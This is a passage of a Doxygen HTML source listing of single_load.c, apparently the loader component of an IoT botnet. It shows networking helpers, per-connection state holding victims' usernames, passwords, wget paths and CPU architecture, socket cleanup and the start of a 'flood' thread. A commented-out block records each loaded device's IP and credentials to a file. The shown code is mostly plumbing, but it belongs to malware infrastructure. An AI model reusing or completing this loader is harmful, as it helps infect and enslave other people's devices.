%02x&quot;</span>, pc[i]);</div><div class="line"><a name="l00154"></a><span class="lineno">  154</span>&#160;        <span class="keywordflow">if</span> ((pc[i] &lt; 0x20) || (pc[i] &gt; 0x7e)) buff[i % 16] = <span class="charliteral">&#39;.&#39;</span>;</div><div class="line"><a name="l00155"></a><span class="lineno">  155</span>&#160;        <span class="keywordflow">else</span> buff[i % 16] = pc[i];</div><div class="line"><a name="l00156"></a><span class="lineno">  156</span>&#160;        buff[(i % 16) + 1] = <span class="charliteral">&#39;\0&#39;</span>;</div><div class="line"><a name="l00157"></a><span class="lineno">  157</span>&#160;    }</div><div class="line"><a name="l00158"></a><span class="lineno">  158</span>&#160;    <span class="keywordflow">while</span> ((i % 16) != 0)</div><div class="line"><a name="l00159"></a><span class="lineno">  159</span>&#160;    {</div><div class="line"><a name="l00160"></a><span class="lineno">  160</span>&#160;        printf (<span class="stringliteral">&quot;   &quot;</span>);</div><div class="line"><a name="l00161"></a><span class="lineno">  161</span>&#160;        i++;</div><div class="line"><a name="l00162"></a><span class="lineno">  162</span>&#160;    }</div><div class="line"><a name="l00163"></a><span class="lineno">  163</span>&#160;    printf (<span class="stringliteral">&quot;  %s\n&quot;</span>, buff);</div><div class="line"><a name="l00164"></a><span class="lineno">  164</span>&#160;}</div><div class="line"><a name="l00165"></a><span class="lineno">  165</span>&#160;</div><div class="line"><a name="l00166"></a><span class="lineno"><a class="line" href="single__load_8c.html#ac962089ec347c5f622ead313b02c802d">  166</a></span>&#160;<span class="keywordtype">int</span> <a class="code" href="single__load_8c.html#ac962089ec347c5f622ead313b02c802d">log_recv</a>(<span class="keywordtype">int</span> sock, <span class="keywordtype">void</span> *buf, <span class="keywordtype">int</span> len, <span class="keywordtype">int</span> flags)</div><div class="line"><a name="l00167"></a><span class="lineno">  167</span>&#160;{</div><div class="line"><a name="l00168"></a><span class="lineno">  168</span>&#160;    memset(buf, 0, len);</div><div class="line"><a name="l00169"></a><span class="lineno">  169</span>&#160;    <span class="keywordtype">int</span> ret = recv(sock, buf, len, flags);</div><div class="line"><a name="l00170"></a><span class="lineno">  170</span>&#160;    <span class="keywordflow">if</span> (ret &gt; 0)</div><div class="line"><a name="l00171"></a><span class="lineno">  171</span>&#160;    {</div><div class="line"><a name="l00172"></a><span class="lineno">  172</span>&#160;        <span class="keywordtype">int</span> i = 0;</div><div class="line"><a name="l00173"></a><span class="lineno">  173</span>&#160;        <span class="keywordflow">for</span>(i = 0; i &lt; ret; i++)</div><div class="line"><a name="l00174"></a><span class="lineno">  174</span>&#160;        {</div><div class="line"><a name="l00175"></a><span class="lineno">  175</span>&#160;            <span class="keywordflow">if</span> (((<span class="keywordtype">char</span> *)buf)[i] == 0x00)</div><div class="line"><a name="l00176"></a><span class="lineno">  176</span>&#160;            {</div><div class="line"><a name="l00177"></a><span class="lineno">  177</span>&#160;                ((<span class="keywordtype">char</span> *)buf)[i] = <span class="charliteral">&#39;A&#39;</span>;</div><div class="line"><a name="l00178"></a><span class="lineno">  178</span>&#160;            }</div><div class="line"><a name="l00179"></a><span class="lineno">  179</span>&#160;        }</div><div class="line"><a name="l00180"></a><span class="lineno">  180</span>&#160;    }</div><div class="line"><a name="l00181"></a><span class="lineno">  181</span>&#160;    <span class="keywordflow">if</span> (<a class="code" href="single__load_8c.html#a4225ca72f2fd6918ee211c80bbeb4799">debug_mode</a>)</div><div class="line"><a name="l00182"></a><span class="lineno">  182</span>&#160;    {</div><div class="line"><a name="l00183"></a><span class="lineno">  183</span>&#160;        <span class="keywordtype">char</span> hex_buf[32] = {0};</div><div class="line"><a name="l00184"></a><span class="lineno">  184</span>&#160;        sprintf(hex_buf, <span class="stringliteral">&quot;state %d - recv: %d&quot;</span>, <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[sock].<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a>, ret);</div><div class="line"><a name="l00185"></a><span class="lineno">  185</span>&#160;        <span class="keywordflow">if</span> (ret != -1)</div><div class="line"><a name="l00186"></a><span class="lineno">  186</span>&#160;            <a class="code" href="single__load_8c.html#af1bddd272ab58d596235a98a58df8c46">hexDump</a>(hex_buf, buf, ret);</div><div class="line"><a name="l00187"></a><span class="lineno">  187</span>&#160;        <span class="keywordflow">else</span></div><div class="line"><a name="l00188"></a><span class="lineno">  188</span>&#160;            printf(<span class="stringliteral">&quot;%s\n&quot;</span>, hex_buf);</div><div class="line"><a name="l00189"></a><span class="lineno">  189</span>&#160;    }</div><div class="line"><a name="l00190"></a><span class="lineno">  190</span>&#160;    <span class="keywordflow">return</span> ret;</div><div class="line"><a name="l00191"></a><span class="lineno">  191</span>&#160;        </div><div class="line"><a name="l00192"></a><span class="lineno">  192</span>&#160;}</div><div class="line"><a name="l00193"></a><span class="lineno">  193</span>&#160;</div><div class="line"><a name="l00194"></a><span class="lineno"><a class="line" href="single__load_8c.html#a1ce52af2a54d5a57b7c857001720ba65">  194</a></span>&#160;<span class="keywordtype">int</span> <a class="code" href="single__load_8c.html#a1ce52af2a54d5a57b7c857001720ba65">log_send</a>(<span class="keywordtype">int</span> sock, <span class="keywordtype">void</span> *buf, <span class="keywordtype">int</span> len, <span class="keywordtype">int</span> flags)</div><div class="line"><a name="l00195"></a><span class="lineno">  195</span>&#160;{</div><div class="line"><a name="l00196"></a><span class="lineno">  196</span>&#160;    <span class="keywordflow">if</span> (<a class="code" href="single__load_8c.html#a4225ca72f2fd6918ee211c80bbeb4799">debug_mode</a>)</div><div class="line"><a name="l00197"></a><span class="lineno">  197</span>&#160;    {</div><div class="line"><a name="l00198"></a><span class="lineno">  198</span>&#160;        <span class="keywordtype">char</span> hex_buf[32] = {0};</div><div class="line"><a name="l00199"></a><span class="lineno">  199</span>&#160;        sprintf(hex_buf, <span class="stringliteral">&quot;state %d - send: %d&quot;</span>, <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[sock].<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a>, len);</div><div class="line"><a name="l00200"></a><span class="lineno">  200</span>&#160;        <a class="code" href="single__load_8c.html#af1bddd272ab58d596235a98a58df8c46">hexDump</a>(hex_buf, buf, len);</div><div class="line"><a name="l00201"></a><span class="lineno">  201</span>&#160;    }</div><div class="line"><a name="l00202"></a><span class="lineno">  202</span>&#160;    <a class="code" href="single__load_8c.html#ae9c69edc71ec3e55ed54dfe5ec400b3b">bytes_sent</a>+=len;</div><div class="line"><a name="l00203"></a><span class="lineno">  203</span>&#160;    <span class="keywordflow">return</span> send(sock, buf, len, flags);</div><div class="line"><a name="l00204"></a><span class="lineno">  204</span>&#160;}</div><div class="line"><a name="l00205"></a><span class="lineno">  205</span>&#160;</div><div class="line"><a name="l00206"></a><span class="lineno"><a class="line" href="single__load_8c.html#a9e3a1d6d9c69a0538ce2947564ea65a7">  206</a></span>&#160;<span class="keywordtype">int</span> <a class="code" href="single__load_8c.html#a9e3a1d6d9c69a0538ce2947564ea65a7">sockprintf</a>(<span class="keywordtype">int</span> sock, <span class="keywordtype">char</span> *formatStr, ...)</div><div class="line"><a name="l00207"></a><span class="lineno">  207</span>&#160;{</div><div class="line"><a name="l00208"></a><span class="lineno">  208</span>&#160;    <span class="keywordtype">char</span> textBuffer[2048] = {0};</div><div class="line"><a name="l00209"></a><span class="lineno">  209</span>&#160;    memset(textBuffer, 0, 2048);</div><div class="line"><a name="l00210"></a><span class="lineno">  210</span>&#160;    va_list args;</div><div class="line"><a name="l00211"></a><span class="lineno">  211</span>&#160;    va_start(args, formatStr);</div><div class="line"><a name="l00212"></a><span class="lineno">  212</span>&#160;    vsprintf(textBuffer, formatStr, args);</div><div class="line"><a name="l00213"></a><span class="lineno">  213</span>&#160;    va_end(args);</div><div class="line"><a name="l00214"></a><span class="lineno">  214</span>&#160;    <span class="keywordtype">int</span> q = <a class="code" href="single__load_8c.html#a1ce52af2a54d5a57b7c857001720ba65">log_send</a>(sock,textBuffer,strlen(textBuffer), MSG_NOSIGNAL);</div><div class="line"><a name="l00215"></a><span class="lineno">  215</span>&#160;    <span class="keywordflow">return</span> q;</div><div class="line"><a name="l00216"></a><span class="lineno">  216</span>&#160;}</div><div class="line"><a name="l00217"></a><span class="lineno">  217</span>&#160;</div><div class="line"><a name="l00218"></a><span class="lineno"><a class="line" href="single__load_8c.html#a46a5c759285caddc5c5a39aee3b2c48d">  218</a></span>&#160;<span class="keywordtype">void</span> *<a class="code" href="single__load_8c.html#a46a5c759285caddc5c5a39aee3b2c48d">memmem</a>(<span class="keyword">const</span> <span class="keywordtype">void</span> *l, <span class="keywordtype">size_t</span> l_len, <span class="keyword">const</span> <span class="keywordtype">void</span> *s, <span class="keywordtype">size_t</span> s_len)</div><div class="line"><a name="l00219"></a><span class="lineno">  219</span>&#160;{</div><div class="line"><a name="l00220"></a><span class="lineno">  220</span>&#160;    <span class="keyword">register</span> <span class="keywordtype">char</span> *cur, *last;</div><div class="line"><a name="l00221"></a><span class="lineno">  221</span>&#160;    <span class="keyword">const</span> <span class="keywordtype">char</span> *cl = (<span class="keyword">const</span> <span class="keywordtype">char</span> *)l;</div><div class="line"><a name="l00222"></a><span class="lineno">  222</span>&#160;    <span class="keyword">const</span> <span class="keywordtype">char</span> *cs = (<span class="keyword">const</span> <span class="keywordtype">char</span> *)s;</div><div class="line"><a name="l00223"></a><span class="lineno">  223</span>&#160;    <span class="keywordflow">if</span> (l_len == 0 || s_len == 0) </div><div class="line"><a name="l00224"></a><span class="lineno">  224</span>&#160;        <span class="keywordflow">return</span> NULL;</div><div class="line"><a name="l00225"></a><span class="lineno">  225</span>&#160;</div><div class="line"><a name="l00226"></a><span class="lineno">  226</span>&#160;    <span class="keywordflow">if</span> (l_len &lt; s_len) </div><div class="line"><a name="l00227"></a><span class="lineno">  227</span>&#160;        <span class="keywordflow">return</span> NULL;</div><div class="line"><a name="l00228"></a><span class="lineno">  228</span>&#160;</div><div class="line"><a name="l00229"></a><span class="lineno">  229</span>&#160;    <span class="keywordflow">if</span> (s_len == 1) </div><div class="line"><a name="l00230"></a><span class="lineno">  230</span>&#160;        <span class="keywordflow">return</span> memchr(l, (<span class="keywordtype">int</span>)*cs, l_len);</div><div class="line"><a name="l00231"></a><span class="lineno">  231</span>&#160;</div><div class="line"><a name="l00232"></a><span class="lineno">  232</span>&#160;    last = (<span class="keywordtype">char</span> *)cl + l_len - s_len;</div><div class="line"><a name="l00233"></a><span class="lineno">  233</span>&#160;    <span class="keywordflow">for</span> (cur = (<span class="keywordtype">char</span> *)cl; cur &lt;= last; cur++)</div><div class="line"><a name="l00234"></a><span class="lineno">  234</span>&#160;        <span class="keywordflow">if</span> (cur[0] == cs[0] &amp;&amp; memcmp(cur, cs, s_len) == 0)</div><div class="line"><a name="l00235"></a><span class="lineno">  235</span>&#160;            <span class="keywordflow">return</span> cur;</div><div class="line"><a name="l00236"></a><span class="lineno">  236</span>&#160;</div><div class="line"><a name="l00237"></a><span class="lineno">  237</span>&#160;    <span class="keywordflow">return</span> NULL;</div><div class="line"><a name="l00238"></a><span class="lineno">  238</span>&#160;}</div><div class="line"><a name="l00239"></a><span class="lineno">  239</span>&#160;</div><div class="line"><a name="l00240"></a><span class="lineno"><a class="line" href="single__load_8c.html#af12c2939d7340f74f1b3aa3f5cd49ca7">  240</a></span>&#160;<span class="keywordtype">void</span> <a class="code" href="single__load_8c.html#af12c2939d7340f74f1b3aa3f5cd49ca7">handle_remote_closed</a>(<span class="keywordtype">int</span> <a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>)</div><div class="line"><a name="l00241"></a><span class="lineno">  241</span>&#160;{</div><div class="line"><a name="l00242"></a><span class="lineno">  242</span>&#160;    <a class="code" href="single__load_8c.html#a132912f867b9c79296731cc953db0e0d">remote_hangup</a>++;</div><div class="line"><a name="l00243"></a><span class="lineno">  243</span>&#160;}</div><div class="line"><a name="l00244"></a><span class="lineno">  244</span>&#160;</div><div class="line"><a name="l00245"></a><span class="lineno"><a class="line" href="single__load_8c.html#adb74e74784f00b371ac2b6174ee15593">  245</a></span>&#160;<span class="keywordtype">void</span> <a class="code" href="single__load_8c.html#adb74e74784f00b371ac2b6174ee15593">handle_timeout</a>(<span class="keywordtype">int</span> <a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>)</div><div class="line"><a name="l00246"></a><span class="lineno">  246</span>&#160;{</div><div class="line"><a name="l00247"></a><span class="lineno">  247</span>&#160;    <a class="code" href="single__load_8c.html#a9ae97c4e98713a8e03d2dc33d07248d5">timed_out</a>++;</div><div class="line"><a name="l00248"></a><span class="lineno">  248</span>&#160;}</div><div class="line"><a name="l00249"></a><span class="lineno">  249</span>&#160;</div><div class="line"><a name="l00250"></a><span class="lineno"><a class="line" href="single__load_8c.html#aa3595475b02d25686ffadbcf19472db2">  250</a></span>&#160;<span class="keywordtype">void</span> <a class="code" href="single__load_8c.html#aa3595475b02d25686ffadbcf19472db2">handle_failed_connect</a>(<span class="keywordtype">int</span> <a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>)</div><div class="line"><a name="l00251"></a><span class="lineno">  251</span>&#160;{</div><div class="line"><a name="l00252"></a><span class="lineno">  252</span>&#160;    <a class="code" href="single__load_8c.html#afa54e717c52681c4ee6722efed32e67f">failed_connect</a>++;</div><div class="line"><a name="l00253"></a><span class="lineno">  253</span>&#160;}</div><div class="line"><a name="l00254"></a><span class="lineno">  254</span>&#160;</div><div class="line"><a name="l00255"></a><span class="lineno"><a class="line" href="single__load_8c.html#a3b804bc1e71e873697dea65f8bd95523">  255</a></span>&#160;<span class="keywordtype">void</span> <a class="code" href="single__load_8c.html#a3b804bc1e71e873697dea65f8bd95523">handle_found</a>(<span class="keywordtype">int</span> <a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>)</div><div class="line"><a name="l00256"></a><span class="lineno">  256</span>&#160;{</div><div class="line"><a name="l00257"></a><span class="lineno">  257</span>&#160;    <span class="comment">/* </span></div><div class="line"><a name="l00258"></a><span class="lineno">  258</span>&#160;<span class="comment">    struct stateSlot_t *state = &amp;stateTable[fd];</span></div><div class="line"><a name="l00259"></a><span class="lineno">  259</span>&#160;<span class="comment">    </span></div><div class="line"><a name="l00260"></a><span class="lineno">  260</span>&#160;<span class="comment">    struct sockaddr_in name;</span></div><div class="line"><a name="l00261"></a><span class="lineno">  261</span>&#160;<span class="comment">    int namelen = (sizeof (struct sockaddr_in));</span></div><div class="line"><a name="l00262"></a><span class="lineno">  262</span>&#160;<span class="comment"></span></div><div class="line"><a name="l00263"></a><span class="lineno">  263</span>&#160;<span class="comment">    getpeername(state-&gt;fd, &amp;name, &amp;namelen);</span></div><div class="line"><a name="l00264"></a><span class="lineno">  264</span>&#160;<span class="comment">    </span></div><div class="line"><a name="l00265"></a><span class="lineno">  265</span>&#160;<span class="comment">    FILE *fp = fopen(&quot;loaded.txt&quot;, &quot;a&quot;);</span></div><div class="line"><a name="l00266"></a><span class="lineno">  266</span>&#160;<span class="comment">    fprintf(outfd, &quot;%d.%d.%d.%d:%s:%s:%s:%d:%d:%d\n&quot;,</span></div><div class="line"><a name="l00267"></a><span class="lineno">  267</span>&#160;<span class="comment">        (name.sin_addr.s_addr &amp; 0xff), </span></div><div class="line"><a name="l00268"></a><span class="lineno">  268</span>&#160;<span class="comment">        ((name.sin_addr.s_addr &amp; (0xff &lt;&lt; 8)) &gt;&gt; 8), </span></div><div class="line"><a name="l00269"></a><span class="lineno">  269</span>&#160;<span class="comment">        ((name.sin_addr.s_addr &amp; (0xff &lt;&lt; 16)) &gt;&gt; 16),</span></div><div class="line"><a name="l00270"></a><span class="lineno">  270</span>&#160;<span class="comment">        ((name.sin_addr.s_addr &amp; (0xff &lt;&lt; 24)) &gt;&gt; 24), </span></div><div class="line"><a name="l00271"></a><span class="lineno">  271</span>&#160;<span class="comment">        </span></div><div class="line"><a name="l00272"></a><span class="lineno">  272</span>&#160;<span class="comment">        state-&gt;username, </span></div><div class="line"><a name="l00273"></a><span class="lineno">  273</span>&#160;<span class="comment">        state-&gt;password, </span></div><div class="line"><a name="l00274"></a><span class="lineno">  274</span>&#160;<span class="comment">        state-&gt;path, </span></div><div class="line"><a name="l00275"></a><span class="lineno">  275</span>&#160;<span class="comment">        state-&gt;wget, </span></div><div class="line"><a name="l00276"></a><span class="lineno">  276</span>&#160;<span class="comment">        state-&gt;endianness, </span></div><div class="line"><a name="l00277"></a><span class="lineno">  277</span>&#160;<span class="comment">        state-&gt;arch</span></div><div class="line"><a name="l00278"></a><span class="lineno">  278</span>&#160;<span class="comment">    );</span></div><div class="line"><a name="l00279"></a><span class="lineno">  279</span>&#160;<span class="comment">    fclose(outfd);</span></div><div class="line"><a name="l00280"></a><span class="lineno">  280</span>&#160;<span class="comment">    */</span></div><div class="line"><a name="l00281"></a><span class="lineno">  281</span>&#160;    </div><div class="line"><a name="l00282"></a><span class="lineno">  282</span>&#160;    <a class="code" href="single__load_8c.html#ade3fd107ea730977ea13ae06f11a466a">found_srvs</a>++;</div><div class="line"><a name="l00283"></a><span class="lineno">  283</span>&#160;}</div><div class="line"><a name="l00284"></a><span class="lineno">  284</span>&#160;</div><div class="line"><a name="l00285"></a><span class="lineno"><a class="line" href="single__load_8c.html#ab5a5480e7ca5603df2e3fb59300b966a">  285</a></span>&#160;<span class="keywordtype">void</span> <a class="code" href="single__load_8c.html#ab5a5480e7ca5603df2e3fb59300b966a">closeAndCleanup</a>(<span class="keywordtype">int</span> <a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>)</div><div class="line"><a name="l00286"></a><span class="lineno">  286</span>&#160;{</div><div class="line"><a name="l00287"></a><span class="lineno">  287</span>&#160;    <span class="keywordflow">if</span>(<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[fd].<a class="code" href="structstateSlot__t.html#ad56d8a19fb1b26615b1a1da138685b90">slotUsed</a> &amp;&amp; <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[fd].fd == fd)</div><div class="line"><a name="l00288"></a><span class="lineno">  288</span>&#160;    {</div><div class="line"><a name="l00289"></a><span class="lineno">  289</span>&#160;        <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>].<a class="code" href="structstateSlot__t.html#ad56d8a19fb1b26615b1a1da138685b90">slotUsed</a> = 0;</div><div class="line"><a name="l00290"></a><span class="lineno">  290</span>&#160;        <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>].<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 0;</div><div class="line"><a name="l00291"></a><span class="lineno">  291</span>&#160;        <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>].<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[0][0] = 0;</div><div class="line"><a name="l00292"></a><span class="lineno">  292</span>&#160;        <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>].<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[1][0] = 0;</div><div class="line"><a name="l00293"></a><span class="lineno">  293</span>&#160;        <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>].<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[2][0] = 0;</div><div class="line"><a name="l00294"></a><span class="lineno">  294</span>&#160;        <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>].<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[3][0] = 0;</div><div class="line"><a name="l00295"></a><span class="lineno">  295</span>&#160;        <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>].<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[4][0] = 0;</div><div class="line"><a name="l00296"></a><span class="lineno">  296</span>&#160;        <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>].<a class="code" href="structstateSlot__t.html#a77d151d0f9c4e016ba16d3444e0d3553">username</a>[0] = 0;</div><div class="line"><a name="l00297"></a><span class="lineno">  297</span>&#160;        <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>].<a class="code" href="structstateSlot__t.html#a04cd8d776257013858dce1f54c7a0d74">password</a>[0] = 0;</div><div class="line"><a name="l00298"></a><span class="lineno">  298</span>&#160;        <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>].<a class="code" href="structstateSlot__t.html#a721d0ad3dabe6a8ab733633dac0b6d8c">echoInd</a> = 0;</div><div class="line"><a name="l00299"></a><span class="lineno">  299</span>&#160;        <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>].<a class="code" href="structstateSlot__t.html#ab4d619ac04c7c52d3acc5872d8e46d18">pathInd</a> = 0;</div><div class="line"><a name="l00300"></a><span class="lineno">  300</span>&#160;        <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>].<a class="code" href="structstateSlot__t.html#a0a912afe1412b83a1a360e2e366cb49f">success</a> = 0;</div><div class="line"><a name="l00301"></a><span class="lineno">  301</span>&#160;        <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>].<a class="code" href="structstateSlot__t.html#af2928a0b0dd2a40d06b5f2294593274f">special</a> = 0;</div><div class="line"><a name="l00302"></a><span class="lineno">  302</span>&#160;        <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>].<a class="code" href="structstateSlot__t.html#a04169334dba5afd2745542626499cd4d">got_prompt</a> = 0;</div><div class="line"><a name="l00303"></a><span class="lineno">  303</span>&#160;    </div><div class="line"><a name="l00304"></a><span class="lineno">  304</span>&#160;        <span class="keywordflow">if</span>(<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[fd].<a class="code" href="structstateSlot__t.html#ad68a66e6fda6e114a1075e5e7ae1e829">is_open</a>)</div><div class="line"><a name="l00305"></a><span class="lineno">  305</span>&#160;        {</div><div class="line"><a name="l00306"></a><span class="lineno">  306</span>&#160;            <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>].<a class="code" href="structstateSlot__t.html#ad68a66e6fda6e114a1075e5e7ae1e829">is_open</a> = 0;</div><div class="line"><a name="l00307"></a><span class="lineno">  307</span>&#160;            </div><div class="line"><a name="l00308"></a><span class="lineno">  308</span>&#160;            shutdown(fd, SHUT_RDWR);</div><div class="line"><a name="l00309"></a><span class="lineno">  309</span>&#160;            <span class="keyword">struct </span>linger linger;</div><div class="line"><a name="l00310"></a><span class="lineno">  310</span>&#160;            linger.l_onoff = 1;</div><div class="line"><a name="l00311"></a><span class="lineno">  311</span>&#160;            linger.l_linger = 0;</div><div class="line"><a name="l00312"></a><span class="lineno">  312</span>&#160;            setsockopt(fd, SOL_SOCKET, SO_LINGER, (<span class="keywordtype">char</span> *) &amp;linger, <span class="keyword">sizeof</span>(linger));</div><div class="line"><a name="l00313"></a><span class="lineno">  313</span>&#160;            <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(fd);</div><div class="line"><a name="l00314"></a><span class="lineno">  314</span>&#160;        }</div><div class="line"><a name="l00315"></a><span class="lineno">  315</span>&#160;    }</div><div class="line"><a name="l00316"></a><span class="lineno">  316</span>&#160;}</div><div class="line"><a name="l00317"></a><span class="lineno">  317</span>&#160;</div><div class="line"><a name="l00318"></a><span class="lineno"><a class="line" href="single__load_8c.html#afdc29b4b6b64963d88e1b69fd47a73d3">  318</a></span>&#160;<span class="keywordtype">void</span> <a class="code" href="single__load_8c.html#afdc29b4b6b64963d88e1b69fd47a73d3">updateAccessTime</a>(<span class="keywordtype">int</span> <a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>)</div><div class="line"><a name="l00319"></a><span class="lineno">  319</span>&#160;{</div><div class="line"><a name="l00320"></a><span class="lineno">  320</span>&#160;    <span class="keywordflow">if</span>(<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[fd].<a class="code" href="structstateSlot__t.html#ad56d8a19fb1b26615b1a1da138685b90">slotUsed</a> &amp;&amp; <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[fd].fd == fd)</div><div class="line"><a name="l00321"></a><span class="lineno">  321</span>&#160;    {</div><div class="line"><a name="l00322"></a><span class="lineno">  322</span>&#160;        <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>].<a class="code" href="structstateSlot__t.html#a88d3c42ff51a10be8140af96e823e79d">updatedAt</a> = time(NULL);</div><div class="line"><a name="l00323"></a><span class="lineno">  323</span>&#160;    }</div><div class="line"><a name="l00324"></a><span class="lineno">  324</span>&#160;}</div><div class="line"><a name="l00325"></a><span class="lineno">  325</span>&#160;</div><div class="line"><a name="l00326"></a><span class="lineno"><a class="line" href="single__load_8c.html#a25b6b0d5a233ac0249fe798020e9d86a">  326</a></span>&#160;<span class="keywordtype">int</span> <a class="code" href="single__load_8c.html#a25b6b0d5a233ac0249fe798020e9d86a">getConnectedSockets</a>()</div><div class="line"><a name="l00327"></a><span class="lineno">  327</span>&#160;{</div><div class="line"><a name="l00328"></a><span class="lineno">  328</span>&#160;    <span class="keywordtype">int</span> q = 0, i = 0;</div><div class="line"><a name="l00329"></a><span class="lineno">  329</span>&#160;    <span class="keywordflow">for</span>(q = 0; q &lt; <a class="code" href="single__load_8c.html#a1291ce6483fd6521a8ea472b6f1384aa">maxFDSaw</a>; q++) <span class="keywordflow">if</span>(<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[q].<a class="code" href="structstateSlot__t.html#ad56d8a19fb1b26615b1a1da138685b90">slotUsed</a>) i++;</div><div class="line"><a name="l00330"></a><span class="lineno">  330</span>&#160;</div><div class="line"><a name="l00331"></a><span class="lineno">  331</span>&#160;    <span class="keywordflow">return</span> i;</div><div class="line"><a name="l00332"></a><span class="lineno">  332</span>&#160;}</div><div class="line"><a name="l00333"></a><span class="lineno">  333</span>&#160;</div><div class="line"><a name="l00334"></a><span class="lineno"><a class="line" href="single__load_8c.html#a412161fb153a2b9a2b6b287baa1b0971">  334</a></span>&#160;<span class="keywordtype">void</span> *<a class="code" href="single__load_8c.html#a412161fb153a2b9a2b6b287baa1b0971">flood</a>(<span class="keywordtype">void</span> *par1)</div><div class="line"><a name="l00335"></a><span class="lineno">  335</span>&#160;{</div><div class="line"><a name="l00336"></a><span class="lineno">  336</span>&#160;    __sync_fetch_and_add(&amp;<a class="code" href="single__load_8c.html#acbdcadfc9f254fc3f06dc6ed0d39c3c6">running_threads</a>, 1);</div><div class="line"><a name="l00337"></a><span class="lineno">  337</span>&#160;</div><div class="line"><a name="l00338"></a><span class="lineno">  338</span>&#160;    <span class="keywordtype">unsigned</span> <span class="keywordtype">char</span> buf[10241] = {0};</div><div class="line"><a name="l00339"></a><span class="lineno">  339</span>&#160;</div><div class="line"><a name="l00340"></a><span class="lineno">  340</span>&#160;    <span class="keyword">struct </span>epoll_event pevents[25] = {0};</div><div class="line"><a name="l00341"></a><span class="lineno">  341</span>&#160;    <span class="keywordtype">int</span> ret = 0, i = 0, got = 0, ii = 0;</div><div class="line"><a name="l00342"></a><span class="lineno">  342</span>&#160;    <span class="keywordflow">while</span>((ret = epoll_wait( <a class="code" 